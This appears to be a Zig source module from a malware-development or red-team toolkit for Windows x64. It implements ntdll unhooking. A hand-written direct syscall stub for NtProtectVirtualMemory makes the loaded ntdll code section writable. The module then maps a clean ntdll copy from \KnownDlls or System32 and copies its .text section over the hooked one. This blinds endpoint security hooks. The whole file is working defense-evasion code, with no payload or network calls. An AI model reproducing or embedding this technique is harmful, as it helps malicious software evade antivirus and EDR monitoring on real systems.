const std = @import("std");
const win = @import("zigwin32").everything;
const windows = @import("../win.zig");
const common = @import("../common.zig");

const IMAGE_FILE_HEADER = win.IMAGE_FILE_HEADER;
const IMAGE_SECTION_HEADER = win.IMAGE_SECTION_HEADER;
const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
const HANDLE = win.HANDLE;
const PVOID = std.os.windows.PVOID;
const NTSTATUS = std.os.windows.NTSTATUS;
const OBJECT_ATTRIBUTES = win.OBJECT_ATTRIBUTES;
const ACCESS_MASK = std.os.windows.ACCESS_MASK;
const UNICODE_STRING = win.UNICODE_STRING;

const MAX_PATH = win.MAX_PATH;
const FILE_GENERIC_READ = win.FILE_GENERIC_READ;
const FILE_SHARE_READ = win.FILE_SHARE_READ;
const FILE_ATTRIBUTE_NORMAL = win.FILE_ATTRIBUTE_NORMAL;
const INVALID_HANDLE_VALUE = win.INVALID_HANDLE_VALUE;
const INVALID_FILE_SIZE: u32 = 0xffffffff;
const FILE_MAP_READ = win.FILE_MAP_READ;
const PAGE_EXECUTE_WRITECOPY = win.PAGE_EXECUTE_WRITECOPY;
const PAGE_EXECUTE_READWRITE = win.PAGE_EXECUTE_READWRITE;
const OBJ_CASE_INSENSITIVE = win.OBJ_CASE_INSENSITIVE;
const SECTION_MAP_READ = std.os.windows.SECTION_MAP_READ;

const getModuleHandleReplacement = windows.getModuleHandleReplacement;
const getDosHeader = windows.getDosHeader;
const getNtHeaders = windows.getNtHeaders;
const GetWindowsDirectoryA = win.GetWindowsDirectoryA;
const CreateFileA = win.CreateFileA;
const GetFileSize = win.GetFileSize;
const ReadFile = win.ReadFile;
const CreateFileMappingA = win.CreateFileMappingA;
const MapViewOfFile = win.MapViewOfFile;
const UnmapViewOfFile = win.UnmapViewOfFile;
const VirtualProtect = win.VirtualProtect;
const InitializeObjectAttributes = win.InitializeObjectAttributes;
const GetLastError = win.GetLastError;
const CloseHandle = win.CloseHandle;

// TODO: current implementation only works on x64
comptime {
    asm (
        \\.global NtProtectVirtualMemory
        \\.section .text
        \\NtProtectVirtualMemory:
        \\  movq %rcx, %r10
        \\  movl $0x50, %eax
        \\  syscall
        \\  ret
    );
}

extern fn NtProtectVirtualMemory(process_handle: HANDLE, base_address: *PVOID, number_of_bytes_to_protect: *u32, new_access_protection: u32, old_access_protection: *u32) callconv(std.os.windows.WINAPI) NTSTATUS;

const NtOpenSection = *const fn (
    section_handle: *HANDLE,
    desired_access: ACCESS_MASK,
    object_attributes: *OBJECT_ATTRIBUTES,
) NTSTATUS;

pub fn replaceNtdllTextSection(allocator: std.mem.Allocator) !void {
    const h_ntdll = try getModuleHandleReplacement(allocator, "ntdll.dll") orelse return error.FailedToGetNtdll;

    const local_ntdll_text = try getNtdllText1(@ptrCast(h_ntdll));

    var old_protection: u32 = 0;
    var base_address: *anyopaque = @ptrCast(local_ntdll_text);
    var number_of_bytes_to_protect: u32 = @intCast(local_ntdll_text.len);

    // TODO: calling NtProtectVirtualMemory after mapping unhooked ntdll will fail with INVALID_PARAMETER error.
    // I don't know why.
    const status = NtProtectVirtualMemory(
        std.os.windows.GetCurrentProcess(),
        &base_address,
        &number_of_bytes_to_protect,
        @bitCast(PAGE_EXECUTE_READWRITE),
        &old_protection,
    );
    if (status != .SUCCESS) {
        std.debug.print("[!] NtProtectVirtualMemory Failed With Error: {s}\n", .{@tagName(status)});
        return error.NtProtectVirtualMemoryFailed;
    }

    const unhooked_ntdll = try mapNtdllFromKnownDlls();
    const unhooked_ntdll_text = try getNtdllText1(unhooked_ntdll);

    @memcpy(local_ntdll_text, unhooked_ntdll_text);

    var old_protection2: PAGE_PROTECTION_FLAGS = @bitCast(old_protection);
    if (VirtualProtect(
        local_ntdll_text.ptr,
        local_ntdll_text.len,
        old_protection2,
        &old_protection2,
    ) == 0) {
        std.debug.print("[!] VirtualProtect [2] Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualProtectFailed;
    }
}

fn getNtdllPath(allocator: std.mem.Allocator) ![:0]u8 {
    var win_path_buf: [MAX_PATH:0]u8 = undefined;
    const win_path_len = GetWindowsDirectoryA(&win_path_buf, win_path_buf.len);
    if (win_path_len == 0) {
        std.debug.print("[!] GetWindowsDirectoryA Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.GetWindowsDirectoryAFailed;
    }
    const win_path = win_path_buf[0..win_path_len];

    const ntdll_path = try std.fs.path.joinZ(allocator, &.{ win_path, "System32", "ntdll.dll" });
    return ntdll_path;
}

pub fn readNtdll(allocator: std.mem.Allocator) ![]u8 {
    const ntdll_path = try getNtdllPath(allocator);
    defer allocator.free(ntdll_path);

    const h_ntdll = CreateFileA(
        ntdll_path,
        FILE_GENERIC_READ,
        FILE_SHARE_READ,
        null,
        .OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        null,
    );
    if (h_ntdll == INVALID_HANDLE_VALUE) {
        std.debug.print("[!] CreateFileA Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateFileAFailed;
    }
    defer _ = CloseHandle(h_ntdll);

    const ntdll_len = GetFileSize(h_ntdll, null);
    if (ntdll_len == INVALID_FILE_SIZE) {
        std.debug.print("[!] GetFileSize Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.GetFileSizeFailed;
    }

    const ntdll_buf = try allocator.alloc(u8, ntdll_len);

    var number_of_bytes_read: u32 = 0;
    if (ReadFile(h_ntdll, ntdll_buf.ptr, ntdll_len, &number_of_bytes_read, null) == 0 or number_of_bytes_read != ntdll_len) {
        std.debug.print("[!] ReadFile Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.ReadFileFailed;
    }

    return ntdll_buf;
}

pub fn mapNtdll(allocator: std.mem.Allocator) ![*]u8 {
    const ntdll_path = try getNtdllPath(allocator);
    defer allocator.free(ntdll_path);

    const h_ntdll = CreateFileA(
        ntdll_path,
        FILE_GENERIC_READ,
        FILE_SHARE_READ,
        null,
        .OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        null,
    );
    if (h_ntdll == INVALID_HANDLE_VALUE) {
        std.debug.print("[!] CreateFileA Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateFileAFailed;
    }
    defer _ = CloseHandle(h_ntdll);

    const h_section = CreateFileMappingA(
        h_ntdll,
        null,
        .{
            .PAGE_READONLY = 1,
            .SEC_IMAGE = 1,
            .PAGE_ENCLAVE_MASK = 1,
        },
        0,
        0,
        null,
    ) orelse {
        std.debug.print("[!] CreateFileMappingA Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateFileMappingAFailed;
    };
    defer _ = CloseHandle(h_section);

    const ntdll_buf = MapViewOfFile(
        h_section,
        FILE_MAP_READ,
        0,
        0,
        0,
    ) orelse {
        std.debug.print("[!] MapViewOfFile Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.MapViewOfFileFailed;
    };

    return @ptrCast(ntdll_buf);
}

pub fn mapNtdllFromKnownDlls() ![*]u8 {
    const nt_open_section = try common.loadFunction(NtOpenSection, "ntdll.dll", "NtOpenSection");

    const ntdll_path = std.unicode.utf8ToUtf16LeStringLiteral("\\KnownDlls\\ntdll.dll");

    var object_name: UNICODE_STRING = .{
        .Buffer = @constCast(@ptrCast(ntdll_path)),
        .Length = ntdll_path.len * @sizeOf(u16),
        .MaximumLength = ntdll_path.len * @sizeOf(u16),
    };

    var object_attributes = OBJECT_ATTRIBUTES{
        .Length = @sizeOf(OBJECT_ATTRIBUTES),
        .ObjectName = &object_name,
        .Attributes = OBJ_CASE_INSENSITIVE,
        .RootDirectory = null,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };

    var h_section: HANDLE = undefined;
    const status = nt_open_section.func(
        &h_section,
        SECTION_MAP_READ,
        &object_attributes,
    );
    if (status != .SUCCESS) {
        std.debug.print("[!] NtOpenSection Failed With Error: {s}\n", .{@tagName(status)});
        return error.NtOpenSectionFailed;
    }
    defer _ = CloseHandle(h_section);

    const ntdll_buf = MapViewOfFile(
        h_section,
        FILE_MAP_READ,
        0,
        0,
        0,
    ) orelse {
        std.debug.print("[!] MapViewOfFile Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.MapViewOfFileFailed;
    };

    return @ptrCast(ntdll_buf);
}

fn getNtdllText1(ntdll_base_address: [*]u8) ![]u8 {
    const nt_headers = getNtHeaders(ntdll_base_address) orelse return error.FailedToGetNtHeaders;

    switch (nt_headers) {
        .nt_headers_64 => |nt_headers_64| {
            const base_address = ntdll_base_address + nt_headers_64.OptionalHeader.BaseOfCode;
            const size = nt_headers_64.OptionalHeader.SizeOfCode;

            return base_address[0..size];
        },
        .nt_headers_32 => |nt_headers_32| {
            const base_address = ntdll_base_address + nt_headers_32.OptionalHeader.BaseOfCode;
            const size = nt_headers_32.OptionalHeader.SizeOfCode;

            return base_address[0..size];
        },
    }
}

fn getNtdllText2(ntdll_base_address: [*]u8) ![]u8 {
    const nt_headers = getNtHeaders(ntdll_base_address) orelse return error.FailedToGetNtHeaders;

    var file_header: IMAGE_FILE_HEADER = undefined;
    var nt_headers_size: usize = 0;
    var nt_headers_address: [*]u8 = undefined;

    switch (nt_headers) {
        .nt_headers_64 => |nt_headers_64| {
            file_header = nt_headers_64.FileHeader;
            nt_headers_size = @sizeOf(@TypeOf(nt_headers_64.*));
            nt_headers_address = @constCast(@ptrCast(nt_headers_64));
        },
        .nt_headers_32 => |nt_headers_32| {
            file_header = nt_headers_32.FileHeader;
            nt_headers_size = @sizeOf(@TypeOf(nt_headers_32.*));
            nt_headers_address = @constCast(@ptrCast(nt_headers_32));
        },
    }

    for (0..file_header.NumberOfSections) |i| {
        const section_header: *const IMAGE_SECTION_HEADER = @alignCast(@ptrCast(nt_headers_address + nt_headers_size + @sizeOf(IMAGE_SECTION_HEADER) * i));

        if (std.mem.startsWith(u8, &section_header.Name, ".text")) {
            const base_address = ntdll_base_address + section_header.VirtualAddress;
            const size = section_header.Misc.VirtualSize;

            return base_address[0..size];
        }
    }

    return error.FailedToGetNtdllTextSection;
}
